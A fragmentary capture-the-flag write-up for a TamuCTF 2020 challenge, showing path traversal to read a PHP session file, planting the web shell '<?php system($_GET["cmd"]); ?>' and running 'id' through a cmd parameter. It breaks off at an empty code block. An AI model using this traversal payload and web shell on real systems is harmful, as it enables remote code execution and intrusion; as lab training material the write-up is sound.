...
Navigating to <i>http://172.17.0.2/index.php</i> gives as a form asking for a name
...
By trying _http://172.17.0.2/index.php?file=../../../../../tmp/sess_imec37rtfcsn9v2p7dd8mqful8_ we get our serialized session data.
...
<?php system($_GET["cmd"]); ?>
```
Now if we navigate to _/index.php?file=../../../../../tmp/sess_lavn0ra1jqa7sh2nien1fehhh1&cmd=id_ we get our **id** command executed. 
![cmdid](/assets/img/TamuCTF_2020/filestorage_6.png)
Perfect, let's read the flag!
1. Find the flag location:<br> 
```bash
